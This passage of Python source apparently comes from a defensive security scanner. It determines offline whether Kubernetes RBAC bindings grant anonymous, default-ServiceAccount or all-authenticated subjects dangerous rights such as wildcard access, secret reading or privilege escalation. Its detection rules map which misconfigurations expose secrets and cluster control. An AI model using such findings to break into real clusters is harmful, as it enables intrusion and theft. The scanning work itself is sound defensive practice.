            return False, "the namespaced Role's namespace must equal the RoleBinding's namespace"
    else:  # ClusterRole
        if ro_ns != "":
            return False, "a ClusterRole role_object must have an empty namespace"
    return True, "linked"


def _k8s_grant_lead(kind: "OracleKind", label: str, reason: str, claim_scope: str) -> OracleSignal:
    return OracleSignal(
        kind=kind, fired=False, confidence=0.0,
        evidence=(f"k8s RBAC verb-grant control {label} is not a provable dangerous (verb,resource) grant to "
                  f"an attacker-occupiable subject: {reason} — not provably critical (stays a lead)"),
        observed={"check_id": label, "reason": "no_dangerous_verb_grant", "claim_scope": claim_scope})


def _k8s_grant_fact(kind: "OracleKind", label: str, subj_class: str, who: str, shapes: "set[str]",
                    claim_scope: str, role_obj: Mapping[str, Any]) -> OracleSignal:
    ro_name = _coerce_text(role_obj.get("name"))[:_K8S_RBAC_GRANT_STR_CAP]
    ro_kind = _coerce_text(role_obj.get("kind"))[:_K8S_RBAC_GRANT_STR_CAP]
    effects = "; ".join(_K8S_GRANT_SHAPE_EFFECT[s] for s in sorted(shapes) if s in _K8S_GRANT_SHAPE_EFFECT)
    subj_desc = {
        "anon": "an UNAUTHENTICATED principal",
        "default_sa": "the namespace-default ServiceAccount (default:default)",
        "all_auth": "ANY authenticated principal (the system:authenticated group)",
    }.get(subj_class, subj_class)
    occ = ""
    if subj_class == "default_sa":
        occ = (" NOTE: this asserts the BINDING GRANT (any principal that IS default:default is so authorized); "
               "the binding's existence is NOT proof a pod runs as that ServiceAccount — occupancy of the "
               "default SA is an ASSUMPTION stated here, not proven by the binding.")
    return OracleSignal(
        kind=kind, fired=True, confidence=0.9,
        evidence=(f"k8s RBAC verb-grant FACT: binding {label} binds {subj_desc} ({who!r}) to {ro_kind} "
                  f"{ro_name!r}, whose PARSED rules authorize {effects} ({claim_scope} scope). Any principal "
                  f"that IS {who!r} is authorized to {effects}. Re-derived over the retained binding + "
                  f"role_object rules (offline, ZERO cluster calls), the roleRef->role join re-checked, not "
                  f"trusted." + occ),
        observed={"check_id": label, "rule": "dangerous_verb_grant", "subject_class": subj_class,
                  "subject": who, "role": ro_name, "role_kind": ro_kind,
                  "dangerous_shapes": sorted(shapes), "claim_scope": claim_scope})


def k8s_rbac_verb_grant_oracle(observed_control: Any) -> OracleSignal:
    """Fire (0.9) when a RETAINED RBAC ``binding`` + its SEPARATELY-retained ``role_object`` PROVABLY grant a
    DANGEROUS (verb,resource) capability to an ATTACKER-OCCUPIABLE subject — the E4 TIER-2 achieved-effect
    confirmation. The oracle PARSES the role's ``rules`` (TIER-1 only name-matched a built-in role) and
    re-derives the judgment over the retained set ALONE (offline, ZERO cluster calls), so a confirmed FACT
    re-verifies offline from its certificate.

    ``observed_control`` is the JSON-safe retained control::

        {"check_id": "binding:ns/name"?,
         "binding": {"kind": "ClusterRoleBinding"|"RoleBinding", "namespace": str?, "name": str?,
                     "subjects": [{"kind","name","namespace","api_group"} | "system:…"],
                     "role_ref": {"name", "kind": "ClusterRole"|"Role", "api_group": "rbac.authorization.k8s.io"}},
         "role_object": {"name", "kind", "api_group", "namespace",
                         "rules": [{"verbs":[…],"resources":[…],"apiGroups":[…],"resourceNames":[…]?}, …],
                         "rules_source": "live_clusterrole_get"|"live_role_get"|"static_manifest",
                         "aggregationRule": {...}?}}

    Fires iff ALL hold — (I) identity linkage re-checked; (IV) rules AUTHORITATIVE (a live API GET, or a
    static manifest with NO aggregationRule); (III) the role's rules contain a dangerous shape; (II) an
    attacker-occupiable subject is bound — under the SUBJECT-GATED eligibility that is the near-zero-FP fix:
      * an ANONYMOUS subject MAY FACT on ANY dangerous shape — full-wildcard, secret-read, OR priv-esc;
      * the DEFAULT ServiceAccount / system:authenticated MAY FACT ONLY on a FULL-WILDCARD (*/*/*) grant AND
        ONLY via a ClusterRoleBinding — NEVER secret-read, NEVER priv-esc, NEVER a namespaced RoleBinding
        (the built-in ``admin`` legitimately grants Secrets get/list/watch, and cluster-read backup/monitoring
        roles legitimately grant */* get/list/watch, so those MOST-COMMON legitimate delegations stay LEAD).
    Everything else — a NAMED subject; a resourceNames-scoped single-secret get; default-SA×secret-read;
    authenticated×broad-read; a linkage break; non-authoritative (aggregated static) rules; malformed/absent
    evidence — stays an honest LEAD (never raises). Pure + deterministic (re-verifies offline)."""
    kind = OracleKind.K8S_RBAC_VERB_GRANT
    if not isinstance(observed_control, Mapping):
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence="no k8s RBAC verb-grant control evidence",
                            observed={"reason": "malformed_capture", "claim_scope": "?"})
    ctl = observed_control
    binding = ctl.get("binding") if isinstance(ctl.get("binding"), Mapping) else {}
    role_obj = ctl.get("role_object") if isinstance(ctl.get("role_object"), Mapping) else {}
    cap = _K8S_RBAC_GRANT_STR_CAP
    cid = _coerce_text(ctl.get("check_id") or binding.get("name") or ctl.get("name"))[:cap].strip()
    label = cid or "?"

    bind_kind = _coerce_text(binding.get("kind"))[:cap]
    bind_ns = _coerce_text(binding.get("namespace") if binding.get("namespace") is not None
                           else binding.get("ns"))[:cap]
    is_crb = bind_kind == "ClusterRoleBinding"
    claim_scope = "cluster" if is_crb else (f"namespace:{bind_ns}" if bind_ns else "namespace:?")

    # (I) identity linkage — re-derived over the retained roleRef + role_object, never trusted.
    linked, link_reason = _k8s_roleref_role_object_linked(binding, role_obj)
    if not linked:
        return _k8s_grant_lead(kind, label, f"identity linkage not proven ({link_reason})", claim_scope)

    # (IV) rules AUTHORITATIVE: a live API GET, or a static manifest with NO aggregationRule.
    rules_source = _k8s_norm(role_obj.get("rules_source") or role_obj.get("rulesSource"))
    has_agg = bool(role_obj.get("aggregationRule")) or bool(role_obj.get("aggregation_rule"))
    authoritative = (rules_source in _K8S_LIVE_RULE_SOURCES) or (rules_source == "static_manifest" and not has_agg)
    if not authoritative:
        why = (", aggregationRule present" if has_agg and rules_source == "static_manifest" else "")
        return _k8s_grant_lead(kind, label,
                               f"role rules are not authoritative (rules_source={rules_source or 'ABSENT'!r}{why})",
                               claim_scope)

    # (III) dangerous shapes over the role's PARSED rules.
    raw_rules = role_obj.get("rules")
    rules = raw_rules if isinstance(raw_rules, (list, tuple)) else []
    shapes: set[str] = set()
    for r in rules:
        shapes |= _k8s_rule_shapes(r)

    # (II) attacker-occupiable subjects, classified.
    raw_subjects = binding.get("subjects")
    subjects = raw_subjects if isinstance(raw_subjects, (list, tuple)) else []
    classified = [(_k8s_subject_class(s), s) for s in subjects]
    anon_subj = next((s for c, s in classified if c == "anon"), None)
    priv_subj = next(((c, s) for c, s in classified if c in ("default_sa", "all_auth")), None)

    # SUBJECT-GATED FACT ELIGIBILITY (the mandatory near-zero-FP fix) --------------------------------------
    # ANON is inherently attacker-occupiable: MAY FACT on (a) OR (b) OR (c) — TIER-2's genuine anon delta is a
    # CUSTOM role whose RULES are dangerous (which TIER-1's built-in-name match missed).
    if anon_subj is not None and shapes:
        return _k8s_grant_fact(kind, label, "anon", _k8s_subject_display(anon_subj), shapes, claim_scope, role_obj)
    # DEFAULT_SA / ALL_AUTH: ONLY a genuine */*/* full-wildcard grant via a ClusterRoleBinding is an
    # unambiguous FACT — NOT secret-read (built-in admin), NOT a namespaced RoleBinding, NOT priv-esc.
    if priv_subj is not None and "full_wildcard" in shapes and is_crb:
        return _k8s_grant_fact(kind, label, priv_subj[0], _k8s_subject_display(priv_subj[1]),
                               {"full_wildcard"}, claim_scope, role_obj)

    in_s = sum(1 for c, _ in classified if c)
    return _k8s_grant_lead(
        kind, label,
        (f"no attacker-occupiable subject is bound to a FACT-eligible dangerous grant (subjects in S: {in_s}; "
         f"dangerous rule shapes: {sorted(shapes) or 'none'}; scope: {claim_scope}) — a default/authenticated "
         f"subject may FACT only on a */*/* ClusterRoleBinding"),
        claim_scope)
